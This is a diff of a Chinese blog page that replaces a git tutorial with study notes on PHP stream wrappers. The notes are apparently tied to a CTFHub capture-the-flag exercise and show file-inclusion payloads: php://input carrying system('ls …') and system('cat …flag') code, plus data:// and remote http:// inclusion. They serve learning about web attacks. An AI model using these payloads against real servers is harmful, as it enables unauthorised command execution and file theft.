@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="git笔记, Chenluo">
+    <meta name="keywords" content="PHP伪协议, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>git笔记 | Chenluo</title>
+    <title>PHP伪协议 | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">git笔记</h1>
+                    <h1 class="description center-align post-title">PHP伪协议</h1>
                 </div>
             </div>
         </div>
@@ -445,8 +445,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/git/">
-                                <span class="chip bg-color">git</span>
+                            <a href="/tags/WEB/">
+                                <span class="chip bg-color">WEB</span>
                             </a>
                         
                     </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-22
+                    2021-05-24
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    475
+                    1.5k
                 </div>
                 
 
@@ -490,67 +490,201 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h1><p>版本控制—————&gt;版本迭代</p>
-<p>版本控制工具;</p>
-<h2 id="1-版本控制的分类"><a href="#1-版本控制的分类" class="headerlink" title="1. 版本控制的分类"></a>1. 版本控制的分类</h2><h3 id="1-本地版本控制"><a href="#1-本地版本控制" class="headerlink" title="1. 本地版本控制"></a>1. 本地版本控制</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">本地保存<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP://"></a>PHP://</h1><p>php官方网站:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
+<p><strong><code>PHP://访问各个输入输出流(I/O streams)</code></strong></p>
+<h4 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtnk16gk5j30np02lgm5.jpg" alt="image-20210524173738209"></p>
+<h2 id="1-php-stdin-php-stdout-和-php-stderr"><a href="#1-php-stdin-php-stdout-和-php-stderr" class="headerlink" title="1. php://stdin, php://stdout 和 php://stderr"></a>1. php://stdin, php://stdout 和 php://stderr</h2><h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明:"></a>说明:</h4><ul>
+<li><p>需要开启allow_url_include</p>
+</li>
+<li><p><strong>直接访问 PHP 进程相应的输入或者输出流.</strong>(和php进程相关)</p>
+</li>
+<li><p><code>php://stdin</code> 是只读的， <code>php://stdout</code> 和 <code>php://stderr</code> 是只写的。</p>
+</li>
+</ul>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><h4 id="说明-2"><a href="#说明-2" class="headerlink" title="说明:"></a>说明:</h4><ul>
+<li><p>需要开启allow_url_include</p>
+</li>
+<li><p><code>php://input</code>读入请求的POST数据<strong>并且执行</strong></p>
+</li>
+<li><p>表单确定类别<code>enctype=”multipart/form-data”</code>无法读取无法执行</p>
+</li>
+</ul>
+<p>实例:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>查看ctfhub webrce中的php://input</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtpijmqh5j30mm09gt9t.jpg" alt="image-20210524184527699"></p>
+<p><strong>利用php://input</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtpjlw2ztj313u0ehdiu.jpg" alt="image-20210524184628054"></p>
+<p>构造payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">#查找flag所在的目录
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../../../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+#查看flag文件
+<span class="token php language-php"><span class="token delimiter important">&lt;?</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../../../../flag_10721'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h3 id="2-集中版本控制（SVN）"><a href="#2-集中版本控制（SVN）" class="headerlink" title="2. 集中版本控制（SVN）"></a>2. 集中版本控制（SVN）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">将要保存的文件集中提交到公司的服务器，所有的版本保存到服务器上（因此需要备份）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtpox7w8yj30sd0e6gnd.jpg" alt="image-20210524185134763"></p>
+<h2 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h2><p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/3683692/blog/3032802">参考博客</a></p>
+<ul>
+<li>需要开启allow_url_include</li>
+</ul>
+<h2 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h2><h4 id="说明-3"><a href="#说明-3" class="headerlink" title="说明:"></a>说明:</h4><p><code>php://fd</code> 允许直接访问指定的文件描述符。 例如<code>php://fd/3</code>引用了文件描述符 3。</p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6">有关文件描述符的介绍</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#include &lt;stdio.h></span>
+<span class="token comment">#include &lt;stdlib.h></span>
+<span class="token comment">#include &lt;string.h></span>
+<span class="token comment">#include &lt;unistd.h></span>
+<span class="token comment">#include &lt;sys/types.h></span>
+<span class="token comment">#include &lt;sys/stat.h></span>
+<span class="token comment">#include &lt;fcntl.h></span>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqreecng5ij30fk0cmq58.jpg" alt="image-20210522184939421"></p>
-<h3 id="3-分布式版本控制"><a href="#3-分布式版本控制" class="headerlink" title="3. 分布式版本控制"></a>3. 分布式版本控制</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqreg8oja6j30g30hgn0s.jpg" alt="image-20210522185131647"></p>
-<h2 id="2-Git和Svn的区别"><a href="#2-Git和Svn的区别" class="headerlink" title="2. Git和Svn的区别"></a>2. Git和Svn的区别</h2><p>Git 集中      每个人电脑内有着版本的全部代码</p>
-<p>Svn分布          版本的代码放在一个中心服务器</p>
-<h2 id="3-Git环境配置"><a href="#3-Git环境配置" class="headerlink" title="3. Git环境配置"></a>3. Git环境配置</h2><p>所有东西下载慢可以采用镜像下载 </p>
-<h2 id="4-启动gitbash"><a href="#4-启动gitbash" class="headerlink" title="4. 启动gitbash"></a>4. 启动gitbash</h2><p>右键</p>
-<p>gitbash：liunx命令</p>
-<p>gitcmd：windows命令</p>
-<p>gitGUI：图形化界面</p>
-<h2 id="5-git配置"><a href="#5-git配置" class="headerlink" title="5. git配置"></a>5. git配置</h2><p>所有的配置文件都保存在本地</p>
-<h3 id="1-查看git配置；"><a href="#1-查看git配置；" class="headerlink" title="1. 查看git配置；"></a>1. 查看git配置；</h3><pre class="line-numbers language-git" data-language="git"><code class="language-git">git config -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token keyword type-declaration">int</span> <span class="token function">main </span><span class="token punctuation">(</span><span class="token keyword type-declaration">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword type-declaration">int</span> fd<span class="token punctuation">;</span>
+    <span class="token keyword type-declaration">int</span> numbytes<span class="token punctuation">;</span>
+    char path<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>
+    char buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<h3 id="2-设置用户名和邮箱"><a href="#2-设置用户名和邮箱" class="headerlink" title="2. 设置用户名和邮箱"></a>2. 设置用户名和邮箱</h3><p>安装git首先要做的就是舍子用户名和邮箱</p>
-<pre class="line-numbers language-git" data-language="git"><code class="language-git">git config --global user.name <span class="token string">"名称"</span>
+    <span class="token comment">/*
+     * O_CREAT:如果文件不存在则创建
+     * O_RDONLY:以只读模式打开文件
+     */</span>
+    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token class-name">O_CREAT</span> <span class="token operator">|</span> <span class="token class-name">O_RDONLY</span><span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//引用文件描述符0644</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token constant">EXIT_FAILURE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-git config --global 邮箱地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>numbytes <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%d bytes read: %s"</span><span class="token punctuation">,</span> numbytes<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">close </span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token constant">EXIT_SUCCESS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="6-Git基本理论"><a href="#6-Git基本理论" class="headerlink" title="6. Git基本理论"></a>6. Git基本理论</h2><h3 id="1-Git工作区域"><a href="#1-Git工作区域" class="headerlink" title="1. Git工作区域"></a>1. Git工作区域</h3><p>工作目录，暂存区，资源库，远程仓库</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfe9bshgj309m09275v.jpg" alt="image-20210522192412735"></p>
-<p>workspace:工作区，平时存放代码的地方</p>
-<p>Index/Stage: 暂存区</p>
-<p>Repository: 仓库区，安全存放数据，HEAD指向最新放入的数据</p>
-<p>REMOTE：远程仓库存放器(GitHub)</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfjnzubsj30tj0ietd4.jpg" alt="image-20210522192924939"></p>
-<h2 id="7-Git-工作流程"><a href="#7-Git-工作流程" class="headerlink" title="7. Git 工作流程"></a>7. Git 工作流程</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrflgo6y1j30kk05ijuj.jpg" alt="image-20210522193107937"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfm7iv7uj30q409q0w4.jpg" alt="image-20210522193151022"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfmmz8i1j30qq0eftdm.jpg" alt="image-20210522193215625"></p>
-<h2 id="8-Git-项目搭建"><a href="#8-Git-项目搭建" class="headerlink" title="8. Git 项目搭建"></a>8. Git 项目搭建</h2><h3 id="1-日常使用的6个git命令"><a href="#1-日常使用的6个git命令" class="headerlink" title="1. 日常使用的6个git命令"></a>1. 日常使用的6个git命令</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfogakh5j30rk08iwi9.jpg" alt="image-20210522193400868"></p>
-<h3 id="2-本地搭建仓库"><a href="#2-本地搭建仓库" class="headerlink" title="2. 本地搭建仓库"></a>2. 本地搭建仓库</h3><h4 id="2-1第一种方式init"><a href="#2-1第一种方式init" class="headerlink" title="2.1第一种方式init"></a>2.1第一种方式init</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init //初始化项目，会产生.git目录 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>在Linux系列的操作系统上，由于Linux的设计思想便是把一切设备都视作文件。因此，文件描述符为在该系列平台上进行设备相关的编程实际上提供了一个统一的方法。</li>
+</ul>
+<h2 id="php-memory-和-php-temp"><a href="#php-memory-和-php-temp" class="headerlink" title="php://memory 和 php://temp"></a>php://memory 和 php://temp</h2><h4 id="说明-4"><a href="#说明-4" class="headerlink" title="说明:"></a>说明:</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtqe9h20ej30nc0b1gmt.jpg" alt="image-20210524191555609"></p>
+<p><strong>结合代码理解官网的解释:</strong></p>
+<p><code>php://memory</code> 和<code>php://temp</code> 允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.sys-get-temp-dir.php">sys_get_temp_dir()</a> 的方式一致。</p>
+<p>php://temp 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，<code>NN</code> 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtqnxzjv5j30nv065q3n.jpg" alt="image-20210524192515291"></p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>对数据流进行过滤的一种协议。</p>
+<ul>
+<li>过滤：过滤是对数据的修改，重整而不是删除！</li>
+<li>resource 参数提供要修改的数据流</li>
+<li>read/write参数提供过滤的方法</li>
+</ul>
+<h4 id="不进行过滤只是简单的读取数据流"><a href="#不进行过滤只是简单的读取数据流" class="headerlink" title="不进行过滤只是简单的读取数据流:"></a>不进行过滤只是简单的读取数据流:</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtqu7dpufj30no08dmy6.jpg" alt="image-20210524193115541"></p>
+<h4 id="通过过滤器读取数据流"><a href="#通过过滤器读取数据流" class="headerlink" title="通过过滤器读取数据流"></a>通过过滤器读取数据流</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtqvshjc7j30nc08rabe.jpg" alt="image-20210524193246846"></p>
+<h4 id="通过过滤器写入数据"><a href="#通过过滤器写入数据" class="headerlink" title="通过过滤器写入数据"></a>通过过滤器写入数据</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqtqxi4dt2j30nb079t9r.jpg" alt="image-20210524193426282"></p>
+<h4 id="官方表格"><a href="#官方表格" class="headerlink" title="官方表格:"></a>官方表格:</h4><table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<h3 id="关于过滤器的解释"><a href="#关于过滤器的解释" class="headerlink" title="关于过滤器的解释:"></a>关于过滤器的解释:</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">官方文档</a></p>
+<ul>
+<li><p><strong>spring.rot13</strong></p>
+<p>str_rot13–对字符串执行rot13转换，ROT13编码简单滴使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符，编码和解码都是用相同的函数，传递一个编码过的字符串作为参数，得到原始的字符串。</p>
+</li>
+<li><p><strong>string.toupper</strong></p>
+</li>
+</ul>
+<p>使用此过滤器等同于strtoupper()函数处理所有的数据流。</p>
+<p>—将字符串转换为大写</p>
+<ul>
+<li><strong>string.tolower</strong></li>
+</ul>
+<p>等同于strlower()函数处理流数据</p>
+<ul>
+<li><strong>string.strip_tags</strong></li>
+</ul>
+<p>可以用两种格式接受参数，一种是和stip_tags()函数第二个参数相似的一个包含有标记列表的字符串，另一种是包含有标记名的数组。</p>
+<ul>
+<li>strip_tags–从字符中去除HTML和PHP标记，该函数尝试返回给定的字符串str去除空字符，html，php标记的结果使用与fgetss()一样的机制去除标记.</li>
+</ul>
+<p>注释：该函数始终会剥离 HTML 注释。这点无法通过 allow 参数改变</p>
+<p><a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/76896357/115666915-c1099b00-a377-11eb-8eb4-b63621306c21.png"><img src="https://user-images.githubusercontent.com/76896357/115666915-c1099b00-a377-11eb-8eb4-b63621306c21.png" alt="image"></a></p>
+<p>运行实例：</p>
+<p><a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/76896357/115666954-cff04d80-a377-11eb-9e91-db8aa4a54fa8.png"><img src="https://user-images.githubusercontent.com/76896357/115666954-cff04d80-a377-11eb-9e91-db8aa4a54fa8.png" alt="image"></a></p>
+<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><ul>
+<li><strong>convert.base64</strong></li>
+</ul>
+<p><code>convert.base64-encode</code>和<code>convert.base64-decode</code>使用这两个过滤器等同于用base64_encode和base64_decode函数处理数据 convert.base64-encode支持以一个关 联数组给出的参数。如果给出了 line-length，base64 输出将被用 line-length个字符为长度而截成块。 如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再 加上 chunk_split()相同。</p>
+<ul>
+<li><strong>convert.quoted</strong></li>
+</ul>
+<p><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code> 使用此过滤器的 decode 版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable�encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外,convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中 剥离的类型提示。</p>
+<ul>
+<li><strong>convert.iconv</strong></li>
+</ul>
+<p>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.* 等同于使用iconv()函数处理流数据</p>
+<ul>
+<li>iconv–字符串按要求的字符编码来转换:</li>
+</ul>
+<p>两种方法:</p>
+<pre class="line-numbers language-none"><code class="language-none">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;
+or
+convert.iconv.&lt;input-encoding&gt;&#x2F;&lt;output-encoding&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="2-2-第二中方式clone"><a href="#2-2-第二中方式clone" class="headerlink" title="2.2 第二中方式clone"></a>2.2 第二中方式clone</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://user-images.githubusercontent.com/76896357/115669842-4f335080-a37b-11eb-8a4f-338a4e9ec9f2.png"><img src="https://user-images.githubusercontent.com/76896357/115669842-4f335080-a37b-11eb-8a4f-338a4e9ec9f2.png" alt="image"></a></p>
+<p>支持的字符编码</p>
+<pre class="line-numbers language-none"><code class="language-none">UCS-4* 
+UCS-4BE 
+UCS-4LE* * 
+UCS-2 
+UCS-2BE 
+UCS-2LE 
+UTF-32* 
+UTF-32BE* 
+UTF-32LE* 
+UTF-16* 
+UTF-16BE* 
+UTF-16LE* 
+UTF-7 
+UTF7-IMAP 
+UTF-8* 
+ASCII*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Git-文件操作"><a href="#Git-文件操作" class="headerlink" title="Git 文件操作"></a>Git 文件操作</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrfw5mpv7j30sl0aok1c.jpg" alt="image-20210522194124356"></p>
-<h3 id="1-查看文件状态"><a href="#1-查看文件状态" class="headerlink" title="1. 查看文件状态"></a>1. 查看文件状态</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> status filename
+<h2 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a>zip:// &amp; bzip2:// &amp; zlib://</h2><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>用于读取压缩包里面的文件</p>
+<p>(参考博客)[<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087]">https://segmentfault.com/a/1190000018991087]</a></p>
+<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><h4 id="说明-5"><a href="#说明-5" class="headerlink" title="说明:"></a>说明:</h4><p>用于执行php代码</p>
+<p>基本格式:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">data</span><span class="token punctuation">:</span><span class="token comment">//text/plain;base64(设置编码方式),php代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token function">git</span> status
-
-<span class="token comment"># 提交命令</span>
-<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>     添加所有的文件到暂存区
-<span class="token function">git</span> commit -m 提交暂存区的哪哦那个到本地仓库 -m 提交信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrg19jwcaj30g2024t9g.jpg" alt="image-20210522194620057"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrg5r8xvrj30ro0f9ti8.jpg" alt="image-20210522195038039"></p>
-<h2 id="使用码云"><a href="#使用码云" class="headerlink" title="使用码云"></a>使用码云</h2><h3 id="1-注册登陆码云，完善个人信息"><a href="#1-注册登陆码云，完善个人信息" class="headerlink" title="1. 注册登陆码云，完善个人信息"></a>1. 注册登陆码云，完善个人信息</h3><h3 id="2-设置绑定ssh-实现免密码登陆"><a href="#2-设置绑定ssh-实现免密码登陆" class="headerlink" title="2. 设置绑定ssh,实现免密码登陆"></a>2. 设置绑定ssh,实现免密码登陆</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrgpf1uonj30rz09sgma.jpg" alt="image-20210522200932500"></p>
-<p>生成公钥</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrgqk2bd3j30fh01x0sw.jpg" alt="image-20210522201038023"></p>
-<p>复制公钥文件id_rsa.pub</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqrgrvw0rkj30fr04smy9.jpg" alt="image-20210522201154671"></p>
-<p>复制粘贴后确定</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqts0ys5e2j30nd05ht95.jpg" alt="image-20210524201221206"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqts16tjbmj30nl07e3z5.jpg" alt="image-20210524201234066"></p>
+<h2 id="Http："><a href="#Http：" class="headerlink" title="Http：//"></a>Http：//</h2><h4 id="说明-6"><a href="#说明-6" class="headerlink" title="说明:"></a>说明:</h4><p><strong>常用于远程文件包含</strong></p>
+<p>也就是通过远程服务器上的php代码，读取到目标服务器代码，并且执行</p>
 
                 
             </div>
@@ -577,7 +711,7 @@ git config --global 邮箱地址<span aria-hidden="true" class="line-numbers-row
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/05/22/433.html">http://echo-machile.github.io/2021/05/22/433.html</a>
+                    <a href="http://echo-machile.github.io/2021/05/24/666.html">http://echo-machile.github.io/2021/05/24/666.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -615,8 +749,8 @@ git config --global 邮箱地址<span aria-hidden="true" class="line-numbers-row
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/git/">
-                                    <span class="chip bg-color">git</span>
+                                <a href="/tags/WEB/">
+                                    <span class="chip bg-color">WEB</span>
                                 </a>
                             
                         </div>
@@ -1070,9 +1204,10 @@ document.body.addEventListener('click', function(e) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/05/24/666.html">
                     <div class="card-image">
@@ -1090,9 +1225,9 @@ document.body.addEventListener('click', function(e) {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1101,6 +1236,7 @@ document.body.addEventListener('click', function(e) {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1119,13 +1255,13 @@ document.body.addEventListener('click', function(e) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/21/88.html">
+                <a href="/2021/05/22/433.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="shell笔记">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="git笔记">
                         
-                        <span class="card-title">shell笔记</span>
+                        <span class="card-title">git笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1136,7 +1272,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-22
                             </span>
                         <span class="publish-author">
                             
@@ -1149,8 +1285,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/linux-shell/">
-                        <span class="chip bg-color">linux shell</span>
+                    <a href="/tags/git/">
+                        <span class="chip bg-color">git</span>
                     </a>
                     
                 </div>
